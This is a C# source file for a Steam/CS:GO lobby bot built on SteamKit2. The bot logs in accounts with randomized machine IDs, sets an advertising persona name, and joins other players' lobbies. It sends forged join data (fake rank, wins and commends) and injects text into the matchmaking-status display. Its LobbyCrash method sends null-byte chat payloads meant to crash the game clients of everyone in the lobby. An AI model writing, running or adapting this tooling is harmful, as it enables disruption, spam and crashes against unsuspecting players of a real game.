using CSGO_Lobby.Other;
using SteamKit2;
using SteamKit2.GC;
using SteamKit2.GC.CSGO.Internal;
using SteamKit2.Internal;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ValveKeyValue;

namespace CSGO_Lobby
{
    public class Bot : ClientMsgHandler
    {
        public new SteamClient Client { private set; get; }
        public SteamUser User { private set; get; }
        public SteamApps Apps { private set; get; }
        public SteamFriends Friends { private set; get; }
        public SteamGameCoordinator GameCoordinator { private set; get; }
        public CallbackManager CallbackManager { private set; get; }

        private Logger Logger;
        private Dictionary<EMsg, List<Action<Bot, IPacketMsg>>> Callbacks;
        private Account Account;
        private static uint UID;

        public bool IsSuccess { private set; get; }
        public bool IsDone { private set; get; }
        private DateTime LastActionTime;
        private DateTime LastLobbyJoinTime;

        public Bot(Account account)
        {
            Account = account;
            Logger = new Logger($"Bot{UID++}");
            Callbacks = new Dictionary<EMsg, List<Action<Bot, IPacketMsg>>>();

            Client = new SteamClient();
            CallbackManager = new CallbackManager(Client);

            User = Client.GetHandler<SteamUser>();
            Apps = Client.GetHandler<SteamApps>();
            GameCoordinator = Client.GetHandler<SteamGameCoordinator>();
            Friends = Client.GetHandler<SteamFriends>();
            Client.AddHandler(this);

            CallbackManager.Subscribe<SteamClient.ConnectedCallback>(OnConnected);
            CallbackManager.Subscribe<SteamClient.DisconnectedCallback>(OnDisconnected);
            CallbackManager.Subscribe<SteamUser.LoggedOnCallback>(OnLoggedOn);
            CallbackManager.Subscribe<SteamUser.LoggedOffCallback>(OnLoggedOff);
            CallbackManager.Subscribe<SteamGameCoordinator.MessageCallback>(OnGCMessage);

            IsDone = true;
            LastActionTime = DateTime.Now;
            LastLobbyJoinTime = DateTime.MinValue;
        }

        // Handler

        public void Handle()
        {
            if ((DateTime.Now - LastActionTime).TotalSeconds > 10 &&
                !IsDone)
            {
                IsSuccess = false;
                IsDone = true;
                Logger.Log("Action timed out");
                return;
            }

            CallbackManager.RunCallbacks();
        }

        // Callbacks

        // Listen for msg and fires callback once
        public void On(EMsg msg, Action<Bot, IPacketMsg> callback)
        {
            if (Callbacks.TryGetValue(msg, out var callbacks))
                callbacks.Add(callback);
            else
                Callbacks.Add(msg, new List<Action<Bot, IPacketMsg>>() { callback });
        }
        
        public override void HandleMsg(IPacketMsg msg)
        {
            if (Callbacks.ContainsKey(msg.MsgType))
            {
                var callbacks = Callbacks[msg.MsgType];
                foreach (var callback in callbacks)
                {
                    callback(this, msg);
                    //callbacks.Remove(callback);
                }
            }

            if (msg.MsgType == EMsg.ClientMMSJoinLobbyResponse)
            {
                LastLobbyJoinTime = DateTime.Now;
            }
        }

        // Connecting

        public void Start()
        {
            LastActionTime = DateTime.Now;
            IsDone = false;
            IsSuccess = false;
            Client.Connect();
        }

        private void OnConnected(SteamClient.ConnectedCallback obj)
        {
            Logger.Log("Connected!");
            LastActionTime = DateTime.Now;

            Login();
        }

        private void OnDisconnected(SteamClient.DisconnectedCallback obj)
        {
            if (!obj.UserInitiated)
                Logger.Log("Lost connection!");

            LastActionTime = DateTime.Now;
            Client.Connect();
        }

        // Authorizing

        public void Login()
        {
            Logger.Log($"Logging in...");

            byte[] machineID = new byte[32];
            new Random().NextBytes(machineID);

            var public_ip = (uint)(new Random()).Next();
            var private_ip = public_ip ^ MsgClientLogon.ObfuscationMask;

            var logon = new ClientMsgProtobuf<CMsgClientLogon>(EMsg.ClientLogon);
            logon.Body.account_name = Account.Username;
            logon.Body.password = Account.Password;

            logon.Body.cell_id = Client.CellID ?? 72;
            logon.Body.ping_ms_from_cell_search = (uint)(new Random().Next(50));

            //logon.Body.public_ip = public_ip;
            logon.Body.obfustucated_private_ip = private_ip;

            logon.Body.client_os_type = (uint)EOSType.Windows10;
            logon.Body.machine_id = machineID;
            logon.Body.machine_name = Utils.RandomString(new Random().Next(14, 32));

            logon.Body.priority_reason = 11;
            logon.Body.client_instance_id = 0;
            logon.Body.is_steam_box = false;
            logon.Body.country_override = "";
            logon.Body.sha_sentryfile = null;
            logon.Body.eresult_sentryfile = (int)EResult.FileNotFound;
            logon.Body.steamguard_dont_remember_computer = false;
            logon.Body.machine_name_userchosen = "";
            logon.Body.qos_level = 2;
            logon.ProtoHeader.client_sessionid = 0;
            logon.ProtoHeader.steamid = new SteamID(0, SteamID.DesktopInstance, Client.Universe, EAccountType.Individual).ConvertToUInt64();
            logon.Body.protocol_version = MsgClientLogon.CurrentProtocol;
            logon.Body.client_package_version = 1550534751;
            logon.Body.supports_rate_limit_response = true;
            logon.Body.sha_sentryfile = null;
            logon.Body.eresult_sentryfile = (int)(logon.Body.sha_sentryfile != null ? EResult.OK : EResult.FileNotFound);
            //logon.Body.should_remember_password = false;
            //logon.Body.steam2_auth_ticket
            Client.Send(logon);
        }

        private void OnLoggedOn(SteamUser.LoggedOnCallback obj)
        {
            if (obj.Result != EResult.OK)
            {
                IsSuccess = false;
                IsDone = true;
                Logger.Error($"Failed logging in! Result: {obj.Result} / {obj.ExtendedResult}");
                return;
            }

            Logger.Log("Logged on!");
            LastActionTime = DateTime.Now;

            // Change name
            Friends.SetPersonaName("User344 (vk.com/moveax)");

            // Add CS:GO to account
            var clientCertRequest = new ClientMsgProtobuf<CMsgClientNetworkingCertRequest>(EMsg.ClientNetworkingCertRequest);
            clientCertRequest.Body.key_data = new byte[] { };
            clientCertRequest.Body.app_id = 730;
            Client.Send(clientCertRequest);

            PlayGame(730);
        }

        private void OnLoggedOff(SteamUser.LoggedOffCallback obj)
        {
            Logger.Log("Logged off!");
        }

        // Game

        public void PlayGame(uint gameID)
        {
            Logger.Log($"Starting app {gameID}...");

            var playGames = new ClientMsgProtobuf<CMsgClientGamesPlayed>(EMsg.ClientGamesPlayed);
            playGames.Body.games_played.Add(new CMsgClientGamesPlayed.GamePlayed
            {
                game_id = gameID,
                steam_id_gs = 0,
                game_ip_address = 0,
                game_port = 0,
                is_secure = false,
                game_extra_info = "",
                process_id = Utils.RandomPID(),
                streaming_provider_id = 0,
                game_flags = 3,
                owner_id = Client.SteamID.AccountID,
                launch_option_type = 0,
                launch_source = 100,
            });
            playGames.Body.client_os_type = (uint)EOSType.Windows10;
            Client.Send(playGames);

            Task.Delay(2000).ContinueWith(x =>
            {
                Logger.Log($"Sending matchmaking hello...");
                LastActionTime = DateTime.Now;

                var clientHello = new ClientGCMsgProtobuf<CMsgClientHello>(
                    (uint)EGCBaseClientMsg.k_EMsgGCClientHello
                );
                GameCoordinator.Send(clientHello, 730);
            });
        }

        // Game coordinator

        private void OnGCMessage(SteamGameCoordinator.MessageCallback obj)
        {
            var map = new Dictionary<uint, Action<IPacketGCMsg>>
            {
                { (uint) EGCBaseClientMsg.k_EMsgGCClientWelcome, OnClientWelcome },
                { (uint) ECsgoGCMsg.k_EMsgGCCStrike15_v2_MatchmakingGC2ClientHello, OnMatchmakingHelloResponse },

                //{ (uint) ECsgoGCMsg.k_EMsgGCCStrike15_v2_PlayersProfile, OnPlayersProfile },
            };

            if (map.TryGetValue(obj.EMsg, out var func))
                func(obj.Message);
            else
                if (obj.EMsg != 9194)
                    Logger.Log($"Unhandled GC message: {obj.EMsg}");
        }

        private void OnClientWelcome(IPacketGCMsg obj)
        {
            Logger.Log("Received client welcome!");
            LastActionTime = DateTime.Now;

            var request = new ClientGCMsgProtobuf<CMsgGCCStrike15_v2_MatchmakingClient2GCHello>(
               (uint)ECsgoGCMsg.k_EMsgGCCStrike15_v2_MatchmakingClient2GCHello
            );
            GameCoordinator.Send(request, 730);
        }

        private void OnMatchmakingHelloResponse(IPacketGCMsg obj)
        {
            Logger.Log("Received client hello!");
            LastActionTime = DateTime.Now;

            IsSuccess = true;
            IsDone = true;
        }

        // Lobby

        public bool IsLobbyValid()
        {
            if (LastLobbyJoinTime <= DateTime.Now.AddSeconds(-20))
                return true;

            return false;
        }

        public void CreateLobby()
        {
            var request = new ClientMsgProtobuf<CMsgClientMMSCreateLobby>(EMsg.ClientMMSCreateLobby);
            request.Header.Proto.routing_appid = 730;
            request.ProtoHeader.routing_appid = 730;
            request.Body.app_id = 730;
            request.Body.max_members = 1;
            request.Body.lobby_flags = 1;
            request.Body.lobby_type = 1;
            request.Body.cell_id = Client.CellID ?? 72;
            //request.Body.public_ip = _PublicIP;
            request.Body.persona_name_owner = Friends.GetPersonaName();
            Client.Send(request);
        }

        public void JoinLobby(ulong lobbyId)
        {
            Logger.Log($"Joining lobby {lobbyId}...");
            LastLobbyJoinTime = DateTime.Now;

            var request = new ClientMsgProtobuf<CMsgClientMMSJoinLobby>(EMsg.ClientMMSJoinLobby);
            request.Header.Proto.routing_appid = 730;
            request.ProtoHeader.routing_appid = 730;
            request.Body.app_id = 730;
            request.Body.persona_name = Friends.GetPersonaName();
            request.Body.steam_id_lobby = lobbyId;
            Client.Send(request);
        }

        public void LeaveLobby(ulong lobbyId)
        {
            Logger.Log($"Leaving lobby {lobbyId}...");
            var request = new ClientMsgProtobuf<CMsgClientMMSLeaveLobby>(EMsg.ClientMMSLeaveLobby);
            request.Header.Proto.routing_appid = 730;
            request.ProtoHeader.routing_appid = 730;
            request.Body.app_id = 730;
            request.Body.steam_id_lobby = lobbyId;
            Client.Send(request);
        }

        public void GetLobbyData(ulong lobbyId)
        {
            //Logger.Log($"Getting lobby data {lobbyId}...");
            var request = new ClientMsgProtobuf<CMsgClientMMSGetLobbyData>(EMsg.ClientMMSGetLobbyData);
            request.Header.Proto.routing_appid = 730;
            request.ProtoHeader.routing_appid = 730;
            request.Body.app_id = 730;
            request.Body.steam_id_lobby = lobbyId;
            Client.Send(request);
        }

        public void LobbySendKeyValues(ulong lobbyId, KVObject kv)
        {
            var request = new ClientMsgProtobuf<CMsgClientMMSSendLobbyChatMsg>(EMsg.ClientMMSSendLobbyChatMsg);
            request.ProtoHeader.routing_appid = 730;
            request.Header.Proto.routing_appid = 730;
            request.Body.app_id = 730;
            request.Body.steam_id_lobby = lobbyId;
            request.Body.steam_id_target = 0;

            var stream = new MemoryStream();
            stream.Write(new byte[] { 0x00, 0x00, 0x35, 0x7F }, 0, 4); // csgo version in big endian. TODO: Automatically fetch version from gc message
            KVSerializer.Create(KVSerializationFormat.KeyValues2Binary).Serialize(stream, kv);
            request.Body.lobby_message = stream.ToArray();

            //Console.WriteLine(ByteArrayToString(request.Body.lobby_message));
            Client.Send(request);
        }

        public void LobbySendChatMsg(ulong lobbyId, string message)
        {
            var kv = new KVObject("SysSession::Command", new[]
            {
                new KVObject("Game::Chat", new[]
                {
                    new KVObject("run", "all"),
                    new KVObject("xuid", Client.SteamID.ConvertToUInt64()),
                    new KVObject("name", Friends.GetPersonaName()),
                    new KVObject("chat", message),
                }),
            });

            LobbySendKeyValues(lobbyId, kv);
        }

        public void LobbySendJoinData(ulong lobbyId, ulong friendId = 0)
        {
            var kv = new KVObject("SysSession::RequestJoinData", new[]
            {
                new KVObject("id", Client.SteamID.ConvertToUInt64()),
                new KVObject("settings", new[]
                {
                    new KVObject("members", new[]
                    {
                        new KVObject("numMachines", 1),
                        new KVObject("numPlayers", 1),
                        new KVObject("numSlots", 1),

                        new KVObject("machine0", new[]
                        {
                            new KVObject("id", Client.SteamID.ConvertToUInt64()),
                            new KVObject("flags", (ulong)0),
                            new KVObject("numPlayers", 1),
                            new KVObject("dlcmask", (ulong)0),
                            new KVObject("tuver", "00000000"),
                            new KVObject("ping", 0),

                            new KVObject("player0", new[]
                            {
                                new KVObject("xuid", Client.SteamID.ConvertToUInt64()),
                                new KVObject("name", Friends.GetPersonaName()),

                                new KVObject("game", new[]
                                {
                                    new KVObject("clanID", 0),
                                    new KVObject("ranking", 18),
                                    new KVObject("ranktype", 0),
                                    new KVObject("wins", 1337),
                                    new KVObject("level", 40),
                                    new KVObject("xppts", 0),
                                    new KVObject("commends", "[f666][t666][l666]"),
                                    new KVObject("medals", ""),
                                    new KVObject("teamcolor", 0),
                                    new KVObject("prime", 0),
                                    new KVObject("loc", "UA"),
                                    //new KVObject("nby", 1),
                                    new KVObject("jfriend", friendId)
                                }),
                            }),
                        }),

                        new KVObject("joinflags", (ulong)0),
                    }),

                    new KVObject("teamResKey", (ulong)0),

                    //new KVObject("joincheck", new[]
                    //{
                    //    new KVObject("[0][1]", "game/apr"),
                    //    new KVObject("public", "system/access"),
                    //    new KVObject("lobby", "game/state"),
                    //    new KVObject("1", "game/nby"),
                    //}),
                }),
            });

            LobbySendKeyValues(lobbyId, kv);
        }

        public void LobbySendOnRemoved(ulong lobbyId)
        {
            var kv1 = new KVObject("SysSession::OnPlayerRemoved", new[]
            {
                new KVObject("xuid", Client.SteamID.ConvertToUInt64()),
            });

            LobbySendKeyValues(lobbyId, kv1);

            var kv2 = new KVObject("SysSession::OnUpdate", new[]
            {
                new KVObject("update", new[]
                {
                    new KVObject("game", new[]
                    {
                        new KVObject("ark", 0),
                        new KVObject("apr", 0),
                        new KVObject("loc", "UA"),
                    }),
                }),
            });

            LobbySendKeyValues(lobbyId, kv2);
        }

        public void LobbySendHTML(ulong lobbyId, string text)
        {
            var kv = new KVObject("Game::ChatReportMatchmakingStatus", new[]
            {
                new KVObject("run", "all"),
                new KVObject("xuid", Client.SteamID.ConvertToUInt64()),
                new KVObject("error", text),
                new KVObject("status", text),
            });

            LobbySendKeyValues(lobbyId, kv);
        }

        public void LobbyCrash(ulong lobbyId)
        {
            //var buffer = new string('\0', 100);
            //var buffer = new string(new char[] { '\0', 'A', '\0' }, 80000);
            var buffer = "";
            for (var i = 0; i < 10; i++)
                buffer += "\0AADADADADADAA\0";

            LobbySendChatMsg(lobbyId, buffer);
        }
        
    }
}
